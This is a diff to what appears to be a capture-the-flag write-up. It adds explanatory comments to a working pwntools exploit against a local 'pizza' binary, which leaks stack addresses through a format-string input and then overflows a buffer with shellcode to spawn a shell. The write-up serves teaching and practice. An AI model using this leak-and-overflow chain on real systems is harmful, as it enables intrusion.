@@ -84,27 +84,31 @@ This gives us access to a totally new terminal!
 
 from pwn import *
 
+# Function to print the stack elements around the stack pointer
 def printStack(core):
     rsp = core.rsp
-    stack_before_rsp = core.read(rsp - 22 * 8, 22 * 8)  # 22 elements before RSP
-    stack_after_rsp = core.read(rsp, 22 * 8)  # 22 elements after RSP
+    stack_before_rsp = core.read(rsp - 22 * 8, 22 * 8)      # Read 22 elements before the stack pointer (RSP)
+    stack_after_rsp = core.read(rsp, 22 * 8)                # Read 22 elements after the stack pointer (RSP)
 
     print("\nStack:")
     for i in range(0, len(stack_before_rsp), 8):
         address = rsp - 22 * 8 + i
         value = core.read(address, 8)
-        arrow = "<---------- RSP" if address == rsp else "    "  # Point to RSP
+        # Check if the current address is the stack pointer (RSP)
+        arrow = "<---------- RSP" if address == rsp else "    "  
         print(f"{hex(address)}\t{value}\t\t\t\t\t\t\t\t\t{arrow}")
 
     for i in range(0, len(stack_after_rsp), 8):
         address = rsp + i
         value = core.read(address, 8)
+        # Check if the current address is the stack pointer (RSP)
         arrow = "<---------- RSP" if address == rsp else "    "  # Point to RSP
         print(f"{hex(address)}\t{value}\t\t\t\t\t\t\t\t\t{arrow}")
 
-# Executable and Linkable Format
+# Load Executable and Linkable Format
 elf = ELF("./pizza")
 
+# Set the context for the binary (architecture, OS, etc.)
 context(arch='amd64', os='linux', endian='little', word_size=64)
 
 getname_address = elf.symbols["getname"]
@@ -114,13 +118,11 @@ getname_address = elf.symbols["getname"]
 #print(shellcraft.amd64.linux.sh())
 #exit()
 
+# Generate shellcode for spawning a shell (pwntools function)
 shellcode = asm(shellcraft.amd64.linux.sh())
 
-
-
+# Input to leak stack addresses
 input1 = b"%p %p %p %p %p %p %p %p %p"
-
-
 
 victim = process("./pizza")
 
@@ -133,26 +135,27 @@ victim.sendline(input1)
 leak = str(victim.recvline(), "latin-1")
 print(leak)
 
-# Send numberof pizzas and recieve output
+# Send number of pizzas and recieve output
 victim.sendline(b"10")
 print(str(victim.recvline(), "latin-1"))
 
+# Calculate the return address for buffer overflow          
 # SHELL CODE + "A"*?? + NEW RET_ADDRESS
 retAddr = int(leak.split(" ")[7], 16) - 112
 input2 = shellcode + b"A"*88 + retAddr.to_bytes(8, 'little')
 
+# Send the second input for buffer overflow
 victim.sendline(input2)
-#print(str(victim.recvline(), "latin-1"))
+print(str(victim.recvline(), "latin-1"))
 
-
+# Switch to interactive mode to interact with the shell
 victim.interactive()
-#core = victim.corefile
 
-#printStack(core)
 
+# core = victim.corefile
+# printStack(core)
 # print(disasm(core.read(core.rip, 8)))
 # print( core.read( core.rsp, 100))
-
 
 exit()
 ```
